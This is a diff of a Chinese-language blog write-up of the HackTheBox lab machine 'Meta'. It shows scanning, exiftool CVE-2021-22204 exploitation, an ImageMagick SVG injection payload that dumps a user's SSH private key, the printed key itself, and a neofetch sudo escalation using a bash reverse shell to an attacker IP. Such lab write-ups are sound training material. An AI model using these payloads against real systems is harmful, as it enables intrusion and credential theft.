@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;429 10.10.11.140                                                                                                              端口扫描22和80: 123456789">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;429 10.10.11.140   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.11.140Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-29 14:02 CS">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Meta - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/01/29/Meta-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;429 10.10.11.140                                                                                                              端口扫描22和80: 123456789">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;429 10.10.11.140   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.11.140Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-29 14:02 CS">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022012901.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022012902.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022012903.jpg">
@@ -125,8 +125,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -148,7 +155,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -215,14 +222,7 @@
 <li><a href="https://www.hackthebox.com/home/machines/profile/429" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/429</a></li>
 <li>10.10.11.140</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012901.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012901.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.140</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-29 14:02 CST</span><br><span class="line">Nmap scan report for 10.10.11.140</span><br><span class="line">Host is up (0.18s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)</span><br><span class="line">|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)</span><br><span class="line">|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">|_http-title: Did not follow redirect to http://artcorp.htb</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 119.09 seconds</span><br></pre></td></tr></table></figure>
 
@@ -231,74 +231,25 @@
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>加hosts后访问：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.140 artcorp.htb</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012902.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012902.jpg" alt=""></p>
 <h1 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h1><p>子域名扫描可以发现一个dev01:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://artcorp.htb/ -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -k -t 50</span><br><span class="line"></span><br><span class="line">Found: dev01.artcorp.htb (Status: 200) [Size: 247]</span><br></pre></td></tr></table></figure>
 
 <h2 id="dev01-artcorp-htb"><a href="#dev01-artcorp-htb" class="headerlink" title="dev01.artcorp.htb"></a>dev01.artcorp.htb</h2><p>同样加hosts后访问：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012903.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012903.jpg" alt=""></p>
 <h2 id="MetaView"><a href="#MetaView" class="headerlink" title="MetaView"></a>MetaView</h2><p>是一个上传图片，解析元数据的在线工具，看起来就是调用的exiftool：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012904.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012905.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012904.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012905.jpg" alt=""></p>
 <h1 id="CVE-2021-22204"><a href="#CVE-2021-22204" class="headerlink" title="CVE-2021-22204"></a>CVE-2021-22204</h1><p>直接搜exiftool相关漏洞：</p>
 <ul>
 <li><a href="https://github.com/convisolabs/CVE-2021-22204-exiftool" target="_blank" rel="noopener">https://github.com/convisolabs/CVE-2021-22204-exiftool</a></li>
 </ul>
 <p>修改ip端口，生成恶意图片上传解析，得到www-data:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012906.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012906.jpg" alt=""></p>
 <h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>运行pspy64之类的可以发现thomas用户定时运行的一些文件：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012907.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012907.jpg" alt=""></p>
 <h2 id="mogrify"><a href="#mogrify" class="headerlink" title="mogrify"></a>mogrify</h2><p>mogrify实际上是ImageMagick：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012908.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012908.jpg" alt=""></p>
 <p>可以搜到相关漏洞：</p>
 <ul>
 <li>InsertScript: ImageMagick - Shell injection via PDF password<br><a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html" target="_blank" rel="noopener">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a></li>
@@ -306,72 +257,23 @@
 <h1 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h1><p>测试可以以thomas身份执行命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp poc.svg &#x2F;var&#x2F;www&#x2F;dev01.artcorp.htb&#x2F;convert_images&#x2F;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012909.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012909.jpg" alt=""></p>
 <p> 修改命令读取ssh私钥,要修复一下格式：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012910.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012910.jpg" alt=""></p>
 <h2 id="exp-svg"><a href="#exp-svg" class="headerlink" title="exp.svg"></a>exp.svg</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">authenticate</span>=<span class="string">'ff" `echo $(cat ~/.ssh/id_rsa)&gt; /dev/shm/id_rsa`;"'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">"pdf:/etc/passwd"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">get</span> <span class="attr">width</span>=<span class="string">"base-width"</span> <span class="attr">height</span>=<span class="string">"base-height"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resize</span> <span class="attr">geometry</span>=<span class="string">"400x400"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">"test.png"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"700"</span> <span class="attr">height</span>=<span class="string">"700"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span>&gt;</span>       </span><br><span class="line">  <span class="tag">&lt;<span class="name">image</span> <span class="attr">xlink:href</span>=<span class="string">"msl:poc.svg"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">width</span>=<span class="string">"100"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="thomas-id-rsa"><a href="#thomas-id-rsa" class="headerlink" title="thomas_id_rsa"></a>thomas_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5</span><br><span class="line">x7up3z5s&#x2F;H&#x2F;yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k&#x2F;rN9PFe&#x2F;MkRsYdH45IvV</span><br><span class="line">qMgzqmJPFAdxmkD9WRnVP9OqEF0ZEYwTFuFPUlNq5hSbNRucwXEXbW0Wk7xdXwe3OJk8hu</span><br><span class="line">ajeY80riz0S8+A+OywcXZg0HVFVli4&#x2F;fAvS9Im4VCRmEfA7jwCuh6tl5JMxfi30uzzvke0</span><br><span class="line">yvS1h9asqvkfY5+FX4D9BResbt9AXqm47ajWePksWBoUwhhENLN&#x2F;1pOgQanK2BR&#x2F;SC+YkP</span><br><span class="line">nXRkOavHBxHccusftItOQuS0AEza8nfE5ioJmX5O9+fv8ChmnapyryKKn4QR4MAqqTqNIb</span><br><span class="line">7xOWTT7Qmv3vw8TDZYz2dnlAOCc+ONWh8JJZHO9i8BXyHNwAH9qyESB7NlX2zJaAbIZgQs</span><br><span class="line">Xkd7NTUnjOQosPTIDFSPD2EKLt2B1v3D&#x2F;2DMqtsnAAAFgOcGpkXnBqZFAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBALfSKCOYB7c&#x2F;KJobGmfRsvsF8jWT6eYyWb2zifeOjiOINpEUQxw5uce7qd8+bPx&#x2F;</span><br><span class="line">8ro4I4K6Djh4fcwQbomdSZ9Y5b3kTOx9VS27WPJP6zfTxXvzJEbGHR+OSL1ajIM6piTxQH</span><br><span class="line">cZpA&#x2F;VkZ1T&#x2F;TqhBdGRGMExbhT1JTauYUmzUbnMFxF21tFpO8XV8HtziZPIbmo3mPNK4s9E</span><br><span class="line">vPgPjssHF2YNB1RVZYuP3wL0vSJuFQkZhHwO48AroerZeSTMX4t9Ls875HtMr0tYfWrKr5</span><br><span class="line">H2OfhV+A&#x2F;QUXrG7fQF6puO2o1nj5LFgaFMIYRDSzf9aToEGpytgUf0gvmJD510ZDmrxwcR</span><br><span class="line">3HLrH7SLTkLktABM2vJ3xOYqCZl+Tvfn7&#x2F;AoZp2qcq8iip+EEeDAKqk6jSG+8Tlk0+0Jr9</span><br><span class="line">78PEw2WM9nZ5QDgnPjjVofCSWRzvYvAV8hzcAB&#x2F;ashEgezZV9syWgGyGYELF5HezU1J4zk</span><br><span class="line">KLD0yAxUjw9hCi7dgdb9w&#x2F;9gzKrbJwAAAAMBAAEAAAGAFlFwyCmMPkZv0o4Z3aMLPQkSyE</span><br><span class="line">iGLInOdYbX6HOpdEz0exbfswybLtHtJQq6RsnuGYf5X8ThNyAB&#x2F;gW8tf6f0rYDZtPSNyBc</span><br><span class="line">eCn3+auUXnnaz1rM+77QCGXJFRxqVQCI7ZFRB2TYk4eVn2l0JGsqfrBENiifOfItq37ulv</span><br><span class="line">kroghSgK9SE6jYNgPsp8B2YrgCF+laK6fa89lfrCqPZr0crSpFyop3wsMcC4rVb9m3uhwc</span><br><span class="line">Bsf0BQAHL7Fp0PrzWsc+9AA14ATK4DR&#x2F;g8JhwQOHzYEoe17iu7&#x2F;iL7gxDwdlpK7CPhYlL5</span><br><span class="line">Xj6bLPBGmRkszFdXLBPUrlKmWuwLUYoSx8sn3ZSny4jj8x0KoEgHqzKVh4hL0ccJWE8xWS</span><br><span class="line">sLk1&#x2F;G2x1FxU45+hhmmdG3eKzaRhZpc3hzYZXZC9ypjsFDAyG1ARC679vHnzTI13id29dG</span><br><span class="line">n7JoPVwFv&#x2F;97UYG2WKexo6DOMmbNuxaKkpetfsqsLAnqLf026UeD1PJYy46kvva1axAAAA</span><br><span class="line">wQCWMIdnyPjk55Mjz3&#x2F;AKUNBySvL5psWsLpx3DaWZ1XwH0uDzWqtMWOqYjenkyOrI1Y8ay</span><br><span class="line">JfYAm4xkSmOTuEIvcXi6xkS&#x2F;h67R&#x2F;GT38zFaGnCHh13&#x2F;zW0cZDnw5ZNbZ60VfueTcUn9Y3</span><br><span class="line">8ZdWKtVUBsvb23Mu+wMyv87&#x2F;Ju+GPuXwUi6mOcMy+iOBoFCLYkKaLJzUFngOg7664dUagx</span><br><span class="line">I8qMpD6SQhkD8NWgcwU1DjFfUUdvRv5TnaOhmdNhH2jnr5HaUAAADBAN16q2wajrRH59vw</span><br><span class="line">o2PFddXTIGLZj3HXn9U5W84AIetwxMFs27zvnNYFTd8YqSwBQzXTniwId4KOEmx7rnECoT</span><br><span class="line">qmtSsqzxiKMLarkVJ+4aVELCRutaJPhpRC1nOL9HDKysDTlWNSr8fq2LiYwIku7caFosFM</span><br><span class="line">N54zxGRo5NwbYOAxgFhRJh9DTmhFHJxSnx&#x2F;6hiCWneRKpG4RCr80fFJMvbTod919eXD0GS</span><br><span class="line">1xsBQdieqiJ66NOalf6uQ6STRxu6A3bwAAAMEA1Hjetdy+Zf0xZTkqmnF4yODqpAIMG9Um</span><br><span class="line">j3Tcjs49usGlHbZb5yhySnucJU0vGpRiKBMqPeysaqGC47Ju&#x2F;qSlyHnUz2yRPu+kvjFw19</span><br><span class="line">keAmlMNeuMqgBO0guskmU25GX4O5Umt&#x2F;IHqFHw99mcTGc&#x2F;veEWIb8PUNV8p&#x2F;sNaWUckEu9</span><br><span class="line">M4ofDQ3csqhrNLlvA68QRPMaZ9bFgYjhB1A1pGxOmu9Do+LNu0qr2&#x2F;GBcCvYY2kI4GFINe</span><br><span class="line">bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p> 使用私钥登录thomas，得到user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012911.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012911.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>可以sudo运行neofetch，只能使用指定参数，但注意，会保留XDG_CONFIG_HOME环境变量,另外当前用户的neofetch配置文件我们可控：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012912.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012913.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012912.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012913.jpg" alt=""></p>
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>所以就可以通过配置文件写恶意命令：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">thomas@meta:~/.config/neofetch$ nano config.conf</span><br><span class="line">thomas@meta:~/.config/neofetch$ head -n 1 config.conf</span><br><span class="line">bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.10.14.12/4444 &lt;&amp;1'</span><br><span class="line">thomas@meta:~/.config/neofetch$ export XDG_CONFIG_HOME="$HOME/.config"</span><br><span class="line">thomas@meta:~/.config/neofetch$ echo $XDG_CONFIG_HOME</span><br><span class="line">/home/thomas/.config</span><br><span class="line">thomas@meta:~/.config/neofetch$ sudo /usr/bin/neofetch \"\"</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012915.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012914.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012915.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012914.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://github.com/convisolabs/CVE-2021-22204-exiftool" target="_blank" rel="noopener">https://github.com/convisolabs/CVE-2021-22204-exiftool</a></li>
 <li>InsertScript: ImageMagick - Shell injection via PDF password<br><a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html" target="_blank" rel="noopener">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a></li>
@@ -385,7 +287,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2022-06-13T07:25:47.348Z" itemprop="dateUpdated">2022-06-13 15:25:47</time>
+    Last updated: <time datetime="2022-06-13T07:25:47.348Z" itemprop="dateUpdated">2022-06-13 15:25:47</time>
 </span><br>
 
 
@@ -552,11 +454,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
